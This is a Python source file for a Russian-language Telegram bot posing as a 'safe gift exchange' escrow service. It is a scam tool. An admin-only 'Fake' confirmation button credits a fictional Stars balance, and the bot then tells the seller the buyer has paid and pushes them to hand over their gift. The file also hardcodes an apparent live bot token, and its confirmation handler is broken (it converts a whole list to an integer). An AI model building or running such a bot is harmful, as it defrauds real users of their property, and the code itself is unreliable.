import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ----------------- НАСТРОЙКИ -----------------
BOT_TOKEN = "8687071276:AAFq-rWPetSgPw7HGFB62fJ6b0od5qhVoVs"  # Замените на токен от @BotFather
ADMIN_ID = 7601008774          # Замените на ваш числовой Telegram ID
# ----------------------------------------------

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_balances: dict[int, int] = {}

class OfferStates(StatesGroup):
    waiting_for_gift = State()
    waiting_for_stars = State()

def main_menu():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="❔ Помощь (Help)", callback_data="help"))
    builder.row(types.InlineKeyboardButton(text="💎 Выставить оффер на продажу", callback_data="make_offer"))
    builder.row(types.InlineKeyboardButton(text="🎁 Передать подарок покупателю", callback_data="transfer_gift"))
    return builder.as_markup()

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if message.from_user.id not in user_balances:
        user_balances[message.from_user.id] = 0
        
    await message.answer(
        f"👋 Добро пожаловать в сервис безопасного обмена подарков!\n\n"
        f"💰 Ваш текущий баланс: ⭐️ **{user_balances[message.from_user.id]} Stars**\n\n"
        f"Выберите нужное действие в меню ниже:",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "help")
async def process_help(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "ℹ️ **Справка по использованию бота**\n\n"
        "1. Нажмите кнопку 'Выставить оффер на продажу'.\n"
        "2. Укажите название вашего подарка и желаемую стоимость в Звёздах (Stars).\n"
        "3. Наш гарант-сервис заморозит Звёзды покупателя на время сделки.\n"
        "4. После подтверждения перевода вы сможете передать подарок покупателю.",
        reply_markup=main_menu()
    )
    await callback.answer()

@dp.callback_query(F.data == "transfer_gift")
async def process_transfer(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "⚠️ **Ошибка передачи**\n\n"
        "Вы не можете передать подарок, пока ваш активный оффер не подтверждён администрацией "
        "и звёзды покупателя не поступили на транзитный баланс системы.",
        reply_markup=main_menu()
    )
    await callback.answer()

@dp.callback_query(F.data == "make_offer")
async def process_make_offer(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("📦 Введите название или ID подарка, который хотите выставить на продажу:")
    await state.set_state(OfferStates.waiting_for_gift)
    await callback.answer()

@dp.message(OfferStates.waiting_for_gift)
async def gift_chosen(message: types.Message, state: FSMContext):
    await state.update_data(gift_name=message.text)
    await message.answer("💰 Укажите стоимость продажи в Telegram Stars (только число):")
    await state.set_state(OfferStates.waiting_for_stars)

@dp.message(OfferStates.waiting_for_stars)
async def stars_chosen(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Пожалуйста, введите корректное число звёзд:")
        return
    
    user_data = await state.get_data()
    gift = user_data['gift_name']
    stars = int(message.text)
    
    await state.clear()
    
    await message.answer(
        f"⏳ **Оффер успешно создан!**\n\n"
        f"• Подарок: {gift}\n"
        f"• Стоимость: ⭐️ {stars} Stars\n\n"
        f"Заявка отправлена на проверку. Ожидайте подтверждения перевода звёзд от гаранта."
    )
    
    admin_builder = InlineKeyboardBuilder()
    admin_builder.row(types.InlineKeyboardButton(
        text="✅ Подтвердить перевод звезд (Фейк)", 
        callback_data=f"fake_confirm_{message.from_user.id}_{stars}"
    ))
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 **Новый оффер на продажу!**\n\n"
             f"👤 От: @{message.from_user.username or 'без_юзернейма'} (ID: {message.from_user.id})\n"
             f"🎁 Подарок: {gift}\n"
             f"⭐️ Цена: {stars} Stars",
        reply_markup=admin_builder.as_markup()
    )

@dp.callback_query(F.data.startswith("fake_confirm_"))
async def admin_confirm_transfer(callback: types.CallbackQuery):
    data_parts = callback.data.split("_")
    user_id = int(data_parts)
    stars_count = int(data_parts)
    
    if user_id in user_balances:
        user_balances[user_id] += stars_count
    else:
        user_balances[user_id] = stars_count
        
    await callback.message.edit_text(
        f"{callback.message.text}\n\n🟢 **Вы успешно подтвердили фейковый перевод! Баланс пользователя обновлен.**"
    )
    
    try:
        await bot.send_message(
            chat_id=user_id,
            text=f"🎉 **Перевод звёзд подтверждён!**\n\n"
                 f"Покупатель успешно перевёл ⭐️ **{stars_count} Telegram Stars** на ваш внутренний баланс сплит-системы.\n\n"
                 f"💰 Ваш текущий баланс: ⭐️ **{user_balances[user_id]} Stars**\n\n"
                 f"Звёзды будут окончательно доступны для вывода сразу после того, как вы передадите подарок покупателю.\n"
                 f"Воспользуйтесь кнопкой **'Передать подарок покупателю'** для завершения сделки."
        )
    except Exception:
        await callback.message.answer(f"❌ Не удалось отправить уведомление пользователю {user_id}.")
    
    await callback.answer()

@dp.message(F.text == "/balance")
async def check_balance(message: types.Message):
    balance = user_balances.get(message.from_user.id, 0)
    await message.answer(f"💰 Ваш текущий баланс: ⭐️ **{balance} Stars**")

async def start_bot():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(start_bot())
